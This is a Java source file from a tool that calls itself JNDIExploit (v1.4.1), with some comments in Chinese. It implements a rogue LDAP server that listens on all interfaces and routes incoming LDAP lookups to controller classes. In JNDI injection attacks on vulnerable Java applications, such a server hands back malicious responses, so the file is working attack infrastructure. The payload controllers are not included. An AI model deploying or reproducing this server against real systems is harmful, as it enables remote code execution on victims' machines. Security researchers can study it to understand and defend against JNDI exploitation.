package com.feihong.ldap;

import com.feihong.ldap.controllers.LdapController;
import com.feihong.ldap.controllers.LdapMapping;
import com.feihong.ldap.utils.Config;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import org.reflections.Reflections;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.lang.reflect.Constructor;
import java.net.InetAddress;
import java.util.Set;
import java.util.TreeMap;


public class LdapServer extends InMemoryOperationInterceptor {

    TreeMap<String, LdapController> routes = new TreeMap<String, LdapController>();

    public static void start() {
        try {
            InMemoryDirectoryServerConfig serverConfig = new InMemoryDirectoryServerConfig("dc=example,dc=com");
            serverConfig.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    Config.ldapPort,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
            //添加操作拦截器
            //将提供的操作拦截器添加到操作拦截器列表中，该列表可用于在请求被内存目录服务器处理之前转换请求，和/或在响应返回给客户端之前转换响应。
            serverConfig.addInMemoryOperationInterceptor(new LdapServer());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(serverConfig);
            ds.startListening();
            System.out.println("   █████\\ ██\\   ██\\ ███████\\  ██████\\       ██\\   ██\\ ██\\   ██\\ \n" +
                    "   \\__██ |███\\  ██ |██  __██\\ \\_██  _|      ███\\  ██ |██ |  ██ |\n" +
                    "      ██ |████\\ ██ |██ |  ██ |  ██ |        ████\\ ██ |██ |  ██ | v1.4.1\n" +
                    "      ██ |██ ██\\██ |██ |  ██ |  ██ |██████\\ ██ ██\\██ |██ |  ██ | JNDIExploit-nuxl1r\n" +
                    "██\\   ██ |██ \\████ |██ |  ██ |  ██ |\\______|██ \\████ |██ |  ██ |\n" +
                    "██ |  ██ |██ |\\███ |██ |  ██ |  ██ |        ██ |\\███ |██ |  ██ |\n" +
                    "\\██████  |██ | \\██ |███████  |██████\\       ██ | \\██ |\\██████  |\n" +
                    " \\______/ \\__|  \\__|\\_______/ \\______|      \\__|  \\__| \\______/ \n" +
                    "                                                                \n" +
                    "                                                                ");
            System.out.println("\033[0;92m" + "[+] " + "\33[0m" + "\033[0;94m" + "LDAP Server Start Listening on: " + "\33[0m" + Config.ldapPort + "...");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public LdapServer() throws Exception {

        //find all classes annotated with @LdapMapping
        Set<Class<?>> controllers = new Reflections(this.getClass().getPackage().getName())
                .getTypesAnnotatedWith(LdapMapping.class);

        //instantiate them and store in the routes map
        for (Class<?> controller : controllers) {
            Constructor<?> cons = controller.getConstructor();
            LdapController instance = (LdapController) cons.newInstance();
            String[] mappings = controller.getAnnotation(LdapMapping.class).uri();
            for (String mapping : mappings) {
                if (mapping.startsWith("/"))
                    mapping = mapping.substring(1); //remove first forward slash

                routes.put(mapping, instance);
            }
        }
    }

    /**
     * {@inheritDoc}
     *
     * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
     * 关键在这个类里进行了处理
     * 官方说明：在提供的搜索结果返回给客户端之前，调用应该对其执行的任何处理。
     */
    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        String base = result.getRequest().getBaseDN();
        //收到ldap请求
        System.out.println("\033[0;95m" + "-------------------------------------------------" + "\33[0m");
        System.out.println("\033[0;92m" + "[+] " + "\33[0m" + "\033[0;94m" + "Received LDAP Query: " + "\33[0m" + base);
        LdapController controller = null;
        //find controller
        //根据请求的路径从route中匹配相应的controller
        for (String key : routes.keySet()) {
            //compare using wildcard at the end
            if (base.toLowerCase().startsWith(key)) {
                controller = routes.get(key);
                break;
            }
        }

        if (controller == null) {
            System.out.println("\033[0;91m" + "[!] Invalid LDAP Query: " + "\33[0m" + base);
            return;
        }

        try {
            //从控制器中进行返回
            controller.process(base);
            controller.sendResult(result, base);
        } catch (Exception e1) {
            System.out.println("\033[0;91m" + "[!] Exception: " + "\33[0m" + e1.getMessage());
        }
    }
}